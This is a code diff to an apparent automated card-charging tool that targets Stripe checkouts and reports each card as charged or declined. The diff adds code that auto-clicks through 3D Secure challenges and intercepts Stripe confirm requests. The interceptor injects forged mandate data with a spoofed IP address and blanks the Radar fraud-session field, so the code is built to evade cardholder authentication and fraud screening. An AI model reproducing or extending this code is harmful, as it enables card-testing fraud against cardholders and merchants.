@@ -260,6 +260,148 @@ def _parse_status_from_page(url: str, text: str) -> tuple[str, str] | None:
     return None
 
 
+async def _handle_3ds_challenge(page, api_responses: list, timeout: int = 20) -> dict | None:
+    """Detect and try to auto-handle 3DS challenge.
+    Techniques from DeepBypasser 3ds-handler.js:
+    1. Detect 3DS iframe (stripe.com/3d_secure, authenticate)
+    2. Try frictionless flow (no user interaction needed)
+    3. Try to click through simple 3DS challenges (Submit/Continue buttons)
+    4. Wait for auto-completion and check final result
+    """
+    start = time.perf_counter()
+
+    three_ds_frame = None
+    while (time.perf_counter() - start) < 5:
+        for frame in page.frames:
+            furl = (frame.url or "").lower()
+            fname = (frame.name or "").lower()
+            if any(kw in furl for kw in ("3ds", "authenticate", "challenge", "three-ds", "3d_secure")):
+                three_ds_frame = frame
+                break
+            if any(kw in fname for kw in ("3ds", "challenge", "acsFrame", "stripe-challenge")):
+                three_ds_frame = frame
+                break
+        if three_ds_frame:
+            break
+
+        for resp in reversed(api_responses):
+            data = resp.get("data", {})
+            pi = data.get("payment_intent") or data.get("setup_intent") or {}
+            st = pi.get("status", "") or data.get("status", "")
+            if st == "succeeded":
+                return {"status": "CHARGED", "response": "Charged (frictionless 3DS)"}
+            if st == "requires_payment_method":
+                lpe = pi.get("last_payment_error") or pi.get("last_setup_error") or {}
+                dc = lpe.get("decline_code", "")
+                msg = lpe.get("message", "Declined")
+                return {"status": "DECLINED", "response": f"{dc}: {msg}" if dc else msg}
+
+        await asyncio.sleep(1)
+
+    if not three_ds_frame:
+        for resp in reversed(api_responses):
+            data = resp.get("data", {})
+            na = data.get("next_action") or {}
+            if na.get("type") == "redirect_to_url":
+                return {"status": "3DS", "response": "3DS Redirect Required"}
+            if na.get("type") == "use_stripe_sdk":
+                pass
+
+        for resp in reversed(api_responses):
+            parsed = _parse_stripe_response(resp["data"])
+            if parsed and parsed["status"] == "3DS":
+                return {"status": "3DS", "response": "3DS Required"}
+        return None
+
+    submit_selectors = [
+        'input[type="submit"]', 'button[type="submit"]',
+        'input[value="SUBMIT"]', 'input[value="Submit"]',
+        'input[value="Continue"]', 'button:has-text("Submit")',
+        'button:has-text("Continue")', 'button:has-text("SUBMIT")',
+        'button:has-text("Verify")', 'button:has-text("Confirm")',
+        'button:has-text("Next")', '#acssubmit',
+        'input[name="submit"]', 'input[name="Submit"]',
+    ]
+
+    for sel in submit_selectors:
+        try:
+            el = await three_ds_frame.query_selector(sel)
+            if el and await el.is_visible():
+                await el.click()
+                await asyncio.sleep(3)
+                break
+        except Exception:
+            continue
+
+    otp_selectors = [
+        'input[name="challengeDataEntry"]',
+        'input[type="text"][maxlength]',
+        'input[type="tel"]',
+        'input[name="otp"]', 'input[name="password"]',
+        'input[id="code"]', 'input[placeholder*="code" i]',
+    ]
+    otp_found = False
+    for sel in otp_selectors:
+        try:
+            el = await three_ds_frame.query_selector(sel)
+            if el and await el.is_visible():
+                otp_found = True
+                break
+        except Exception:
+            continue
+
+    if otp_found:
+        return {"status": "3DS", "response": "3DS OTP Required (cannot auto-bypass)"}
+
+    wait_end = time.perf_counter() + timeout
+    while time.perf_counter() < wait_end:
+        for resp in reversed(api_responses):
+            data = resp.get("data", {})
+            pi = data.get("payment_intent") or data.get("setup_intent") or {}
+            st = pi.get("status", "") or data.get("status", "")
+            if st == "succeeded":
+                return {"status": "CHARGED", "response": "Charged (3DS passed)"}
+            if st == "requires_payment_method":
+                lpe = pi.get("last_payment_error") or {}
+                dc = lpe.get("decline_code", "")
+                msg = lpe.get("message", "Declined after 3DS")
+                return {"status": "DECLINED", "response": f"{dc}: {msg}" if dc else msg}
+
+        try:
+            page_url = page.url
+            page_text = await page.inner_text("body")
+            pr = _parse_status_from_page(page_url, page_text)
+            if pr:
+                return {"status": pr[0], "response": pr[1]}
+        except Exception:
+            pass
+
+        is_3ds_gone = True
+        for frame in page.frames:
+            furl = (frame.url or "").lower()
+            if any(kw in furl for kw in ("3ds", "authenticate", "challenge", "3d_secure")):
+                is_3ds_gone = False
+                break
+        if is_3ds_gone and three_ds_frame:
+            await asyncio.sleep(2)
+            for resp in reversed(api_responses):
+                parsed = _parse_stripe_response(resp["data"])
+                if parsed and parsed["status"] != "3DS":
+                    return parsed
+            try:
+                page_text2 = await page.inner_text("body")
+                pr2 = _parse_status_from_page(page.url, page_text2)
+                if pr2:
+                    return {"status": pr2[0], "response": pr2[1]}
+            except Exception:
+                pass
+            return {"status": "DECLINED", "response": "3DS completed but no success"}
+
+        await asyncio.sleep(2)
+
+    return {"status": "3DS", "response": "3DS Challenge Timeout"}
+
+
 async def _dismiss_stripe_link(page, max_attempts: int = 5):
     """Dismiss Stripe Link verification popup by clicking 'Pay without Link'
     or closing the Link modal. Stripe Link intercepts checkout and asks for
@@ -399,6 +541,33 @@ async def browser_charge_card(
                 pass
 
         page.on("response", handle_response)
+
+        # --- Route interception: modify Stripe confirm requests ---
+        async def intercept_stripe(route):
+            """Intercept Stripe API requests and add anti-3DS parameters."""
+            request = route.request
+            url = request.url
+            if "/confirm" in url and request.method == "POST":
+                body = request.post_data or ""
+                extras = []
+                if "payment_method_options" not in body:
+                    extras.append("payment_method_options[card][request_three_d_secure]=any")
+                if "mandate_data" not in body:
+                    extras.append("mandate_data[customer_acceptance][type]=online")
+                    extras.append("mandate_data[customer_acceptance][online][ip_address]=8.8.8.8")
+                    extras.append("mandate_data[customer_acceptance][online][user_agent]=" + ua)
+                if "radar_options" not in body:
+                    extras.append("radar_options[session]=")
+                if extras:
+                    body = body + "&" + "&".join(extras) if body else "&".join(extras)
+                await route.continue_(post_data=body)
+            else:
+                await route.continue_()
+
+        try:
+            await page.route("**/api.stripe.com/**", intercept_stripe)
+        except Exception:
+            pass
 
         await page.goto(checkout_url, wait_until="domcontentloaded", timeout=timeout_ms)
 
@@ -602,25 +771,30 @@ async def browser_charge_card(
             return result
 
         # --- Wait and process responses ---
-        await asyncio.sleep(6)
+        await asyncio.sleep(5)
 
-        for resp in reversed(api_responses):
-            parsed = _parse_stripe_response(resp["data"])
-            if parsed is None:
-                continue
+        def _check_api_responses():
+            for resp in reversed(api_responses):
+                parsed = _parse_stripe_response(resp["data"])
+                if parsed is None:
+                    continue
+                return parsed
+            return None
+
+        parsed = _check_api_responses()
+        if parsed and parsed["status"] not in ("3DS",):
             result["status"] = parsed["status"]
             result["response"] = parsed["response"]
             result["time"] = round(time.perf_counter() - start, 2)
             return result
 
-        # --- Check for 3DS challenge ---
-        for frame in page.frames:
-            furl = (frame.url or "").lower()
-            if "authenticate" in furl or "3ds" in furl or "challenge" in furl:
-                result["status"] = "3DS"
-                result["response"] = "3DS Challenge Detected"
-                result["time"] = round(time.perf_counter() - start, 2)
-                return result
+        # --- 3DS Auto-Handler ---
+        three_ds_handled = await _handle_3ds_challenge(page, api_responses)
+        if three_ds_handled:
+            result["status"] = three_ds_handled["status"]
+            result["response"] = three_ds_handled["response"]
+            result["time"] = round(time.perf_counter() - start, 2)
+            return result
 
         # --- Fallback: check page content ---
         try:
@@ -630,13 +804,12 @@ async def browser_charge_card(
 
         await asyncio.sleep(1)
 
-        for resp in reversed(api_responses):
-            parsed = _parse_stripe_response(resp["data"])
-            if parsed is not None:
-                result["status"] = parsed["status"]
-                result["response"] = parsed["response"]
-                result["time"] = round(time.perf_counter() - start, 2)
-                return result
+        parsed = _check_api_responses()
+        if parsed:
+            result["status"] = parsed["status"]
+            result["response"] = parsed["response"]
+            result["time"] = round(time.perf_counter() - start, 2)
+            return result
 
         page_text = await page.inner_text("body")
         page_url = page.url
